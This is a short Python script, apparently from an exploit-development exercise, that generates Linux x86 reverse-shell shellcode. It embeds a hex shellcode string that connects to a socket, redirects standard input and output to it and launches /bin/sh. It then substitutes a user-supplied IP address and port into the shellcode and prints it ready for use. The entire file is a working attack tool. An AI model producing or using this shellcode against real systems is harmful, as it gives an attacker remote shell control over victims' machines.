#!/usr/bin/python3

import sys
import socket
import binascii

# The shellcode used
shellcode = '\\x89\\xe5\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x50\\x50\\x68\\x7f\\x01\\x01\\x01\\x66\\x68\\x15\\xb3\\x66\\x6a\\x02\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc6\\x31\\xc0\\x66\\xb8\\x6a\\x01\\x89\\xf3\\x89\\xe1\\x89\\xef\\x29\\xe7\\x89\\xfa\\xcd\\x80\\x31\\xc9\\xb1\\x03\\x31\\xc0\\xb0\\x3f\\x89\\xf3\\xfe\\xc9\\xcd\\x80\\xfe\\xc1\\xe2\\xf2\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80'

# Check if the ip and port are specified
if len(sys.argv) < 3:
	print('Usage: python {name} <IP> <PORT>'.format(name = sys.argv[0]))
	print('Example: python {name} 127.1.1.1 5555'.format(name = sys.argv[0]))
	exit(1)

# This part find and replace the ip address
ip = sys.argv[1].split('.')
ip_in_hex = '{:02X}{:02X}{:02X}{:02X}'.format(*map(int, ip))
shellcode = shellcode.replace('\\x7f\\x01\\x01\\x01', '\\x{0}\\x{1}\\x{2}\\x{3}'.format(
										ip_in_hex[0:2],
										ip_in_hex[2:4],
										ip_in_hex[4:6],
										ip_in_hex[6:8]
))

# This part find and replace the port number
port = hex(socket.htons(int(sys.argv[2])))
shellcode = shellcode.replace('\\x15\\xb3', '\\x{0}\\x{1}'.format(port[4:6], port[2:4]))

# Print the shellcode
print(shellcode)
